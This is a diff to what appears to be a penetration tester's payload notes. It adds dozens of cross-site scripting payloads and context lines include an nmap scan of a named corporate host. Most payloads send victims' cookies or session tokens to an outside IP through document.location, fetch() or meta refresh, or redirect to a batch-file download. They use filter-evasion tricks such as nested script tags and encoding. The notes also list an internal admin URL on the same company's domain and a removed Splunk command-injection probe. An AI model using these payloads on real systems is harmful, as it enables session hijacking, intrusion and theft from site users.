@@ -53,6 +53,54 @@ nmap -sS -sV -T3 --version-light -p- --open mcslog.skhynix.com
 <script>document.location="http://localhost:8000/index.php?cookie="+document.cookie;</script>
 <object data="datatext/html;base64,HNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="></object>
 
-
-/ko-KR/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=SKhy_VulnTeam_TEST%5BCMD%5D.jsp
-1724732223.39015226_AA8078D3-E33E-44E3-9ADE-71A6EF92910E
+<img src/on-mouseover=alert(1)/>  
+<audio src/on-error=\alert(1)/> - unicode 우회  
+<button on-focus=alert(1) autofocus />  
+"><script>debugger;location.href='http://10.144.154.52 
+<img src/onerror="debugger;location.href='http://10.144.154.52'"/> 
+<script>document.location="http://10.144.154.52:8000/hacking.bat"</script> 
+<script>document.location='http://localhost:8000/cookie.php?cookie'=+document.cookie</script> 
+xx";%0alocation.href="http://10.144.154.52";// 
+<a href=\" jav&#65script:prompt(1)\">test</a> 
+><input onauxclick=confirm('xsstest')> 
+<script>document.location='http://192.168.56.103/cookie?'+document.cookie</script> 
+<script>location.href("http://hacker/cookie.php?value="+document.cookie);</script> 
+*/a=%27http://10.144.154.52;b=document.cookie;location.href=a%2bb;/* 
+x'%0alocation.href='http://10.144.154.52:8000';%0avar b=' 
+<img src onclick="location.href='http://10.144.154.52:8000'" style="width:2px;height:2px"/> 
+"><script>window.location='http://10.144.154.52'</script> 
+<svg onload='fetch('http://10.144.154.52:8000/?cookie='+document.cookie)"> 
+<svg onload='fetch('http://10.144.154.52/?cookie='+sessionStorage.auth)"> 
+"><svg/onload="alert(1) 
+ <link rel="stylesheet" type="#" href="10.144.154.52.8000/reco_login2.html"> 
+<p onclick=prompt(2123)>xsstest</p> 
+<meta http-equiv="refresh" content="1;url=http://10.144.154.52:8000/index.html?cookie='+document.cookie"/> 
+<meta http-equiv="refresh" content="1;url=http://10.144.154.52:8000/index.html"/> 
+<meta http-equiv="refresh"Curl-Multithreaded+content="0;+url=http://10.144.154.52:8000/"> 
+<meta http-equiv="refresh" content="1;url=http://www.example.com/" />
+<meta http-equiv="refresh" content="0; url=http://10.144.154.52:8000/"> 
+<meta http-equiv="refresh" content="0; url=http://10.144.154.52:8000/index.html"> 
+<meta http-equiv="refresh" content="0; url=http://10.144.154.52:8000"> 
+<script>document.location="http://localhost:8000/index.html?cookie="+document.cookie;</script> 
+<meta http-equiv="refresh" content="1;url=http://10.144.154.52:8000/index.html?cookie=document.cookie"/> 
+test"><meta http-equiv="refresh" content="0; url=http://10.144.154.52:8000/"> 
+<img src=x onerror=location.replace("http://10.144.154.52:8000")> 
+%22%3e%3cinput%20type%3dtext%20autofocus%20onfocus%3dalert(XSS_TEST)%2f%2f 
+"><script>debugger;location.href='http://10.144.154.52:8000'</script><input type="hidden" value="x 
+"><noembed><img title="</noembed><img src onerror='document.location.href="http://10.144.154.52:8000?cookie="+document.cookie'>"></noembed> 
+"><svg onload="fetch('http://10.144.154.52:8000/?cookie='+document.cookie) 
+java%0d%0ascript%0d%0a:alert(0) 
+%22%3e%3cscscriptript%3ewindow.location='http://10.144.154.52:8000'%3c/scscriptript%3e 
+"><svg onpointermove="window.location='http://10.144.154.52:8000'"> 
+"};alert("xss_test");let+param1+=+{"TEST":"TEST 
+"};var+link='악성파일경로';location.href=link;let+param1+=+{"TEST":"TEST 
+';});confirm("xss_TEST");$(function(){// 
+"};var+link='악성파일경로';location.href=link;$(function(){// 
+<a href=\"javascript:alert('xss_test')\">test<img src=\"x\" onerror=\"alert('xss')\"></a> 
+tt"><img src=1 onclIck=conFirm(3331)> 
+<scscriptript>ononerrorerror=Hacking() function Hacking(){ parent.location.href='http://10.144.154.52:8000'}</scscriptript> 
+<a href="10.144.154.52.8000/reco_login2.html" download>XSS</a> 
+style="background-image; url(javascript:alert('ss')) 
+<a href='www.webtest.com'> 
+http://thanksdev.skhynix.com/admin/TR/ht_thanks_result.do 
+<a href="http://10.144.154.52:8000/index2.html">download</a> 
